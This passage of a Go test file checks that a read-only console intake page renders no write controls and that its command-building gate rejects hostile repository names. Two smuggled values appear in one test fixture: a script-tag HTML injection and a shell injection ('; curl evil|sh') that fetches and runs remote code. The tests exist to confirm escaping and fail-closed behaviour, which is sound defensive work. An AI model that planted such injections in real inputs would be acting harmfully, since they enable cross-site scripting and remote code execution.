	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	for _, want := range []string{"No issue-scan runs projected.", "hive factory scan-issues", "cc:pr-ready"} {
		if !strings.Contains(body, want) {
			t.Errorf("empty intake body missing %q; body: %s", want, body)
		}
	}
}

// READ-ONLY BOUNDARY: the intake surface — full page, fragment, and an open
// unblock drawer — must carry zero write affordances. The unblock section is
// selectable copy-paste text, never a control; the only governed write route
// (/ops/hive/model-policy) must not leak here in any form. Card-open buttons
// and the drawer close button are legitimately type="button" and are NOT
// asserted absent — only form/hx-write/submit/write-route markers are.
func TestConsoleIntakeSurfaceRendersNoWriteControls(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	bodies := map[string]string{}
	for name, target := range map[string]string{
		"page":     "http://site.test/console/intake",
		"fragment": "http://site.test/console/intake/fragment",
		// run_docs_172_scope / select_and_design_approach is the fixture card
		// whose gate passes: its unblock section renders real commands, so
		// this is the strongest case for a leaked write control.
		"drawer": "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach",
	} {
		req := httptest.NewRequest(http.MethodGet, target, nil)
		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("%s: status = %d", name, w.Code)
		}
		bodies[name] = w.Body.String()
	}

	// Sanity: the drawer actually rendered the unblock command, so a passing
	// no-write-controls assertion below isn't vacuous (nothing to leak).
	if !strings.Contains(bodies["drawer"], "gh issue edit 172 --repo transpara-ai/docs") {
		t.Fatal("drawer fixture must render the unblock command, or this test proves nothing")
	}

	for name, body := range bodies {
		lower := strings.ToLower(body)
		for _, forbidden := range []string{
			"<form", "hx-post", "hx-put", "hx-delete", "hx-patch",
			`type="submit"`, "/ops/hive/model-policy",
		} {
			if strings.Contains(lower, strings.ToLower(forbidden)) {
				t.Errorf("%s: read-only intake surface must not render %q", name, forbidden)
			}
		}
	}
}

// Hostile projection data must neither escape into markup nor produce a
// command. Two hostile target repos share one run each: one carries HTML
// injection, the other shell metacharacters. consoleUnblockRepoPattern is a
// strict owner/repo allowlist (graph/console_unblock.go), so both refuse to
// render ANY command — this asserts the fail-closed GATE, not just escaping.
func TestConsoleIntakeUnblockGateRefusesHostileData(t *testing.T) {
	const runHTML = "run_hostile_html_226"
	const runShell = "run_hostile_shell_226"
	const stageHTML = "select_and_design_approach"
	const stageShell = "select_and_design_approach"
	const repoHTML = `transpara-ai/docs"><script>alert(1)</script>`
	const repoShell = `transpara-ai/docs; curl evil|sh`

	fixture := fmt.Sprintf(`{
		"projection_schema_version": "1.0.0",
		"projection_subject": "civilization_assembly",
		"derivation_status": "complete",
		"generated_at": %q,
		"issue_scan_projection": {
			"runs": [
				{
					"run_id": %q,
					"state": "human_action",
					"target_issue": {"repo": %q, "number": 226, "labels": ["cc:needs-human-scope"]}
				},
				{
					"run_id": %q,
					"state": "human_action",
					"target_issue": {"repo": %q, "number": 226, "labels": ["cc:needs-human-scope"]}
				}
			],
			"stages": [
				{"run_id": %q, "stage_id": %q, "current_state": "human_action"},
				{"run_id": %q, "stage_id": %q, "current_state": "human_action"}
			],
			"blockers": [
				{"run_id": %q, "stage_id": %q, "blocker_type": "needs_human_scope", "required_action": "human must clarify issue scope"},
				{"run_id": %q, "stage_id": %q, "blocker_type": "needs_human_scope", "required_action": "human must clarify issue scope"}
			]
		}
	}`,
		time.Now().UTC().Format(time.RFC3339),
		runHTML, repoHTML,
		runShell, repoShell,
		runHTML, stageHTML,
		runShell, stageShell,
		runHTML, stageHTML,
		runShell, stageShell,
	)

	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, fixture)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	get := func(target string) string {
		req := httptest.NewRequest(http.MethodGet, target, nil)
		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("%s: status = %d", target, w.Code)
		}
		return w.Body.String()
	}

	pageBody := get("http://site.test/console/intake")
	drawerHTML := get("http://site.test/console/intake/card?run=" + url.QueryEscape(runHTML) + "&stage=" + url.QueryEscape(stageHTML))
	drawerShell := get("http://site.test/console/intake/card?run=" + url.QueryEscape(runShell) + "&stage=" + url.QueryEscape(stageShell))
	combined := pageBody + drawerHTML + drawerShell

	if strings.Contains(combined, "<script>alert") {
		t.Error("raw <script>alert survived escaping in the intake surface")
	}
	// "gh issue edit" must be absent everywhere: the gate refuses to build ANY
	// command for a hostile repo, so neither hostile payload (the HTML
	// injection nor "curl evil|sh") can ever appear inside a gh command. This
	// is the gate assertion the brief calls for. The repo string legitimately
	// still renders as escaped, read-only display text elsewhere on the
	// card/drawer (e.g. the "Issue" field) — that is not a command and is not
	// asserted absent here.
	if strings.Contains(combined, "gh issue edit") {
		t.Error("gate must refuse ANY command for a hostile repo — repo pattern is a strict owner/repo allowlist")
	}
	if !strings.Contains(pageBody, "&lt;script") {
		t.Error(`expected escaped form "&lt;script" in page output; escaping did not occur`)
	}
	if strings.Contains(strings.ToLower(combined), "unblock available") {
		t.Error(`"unblock available" hint must be suppressed too — the gate refused, so UnblockAvailable must be false`)
	}
}
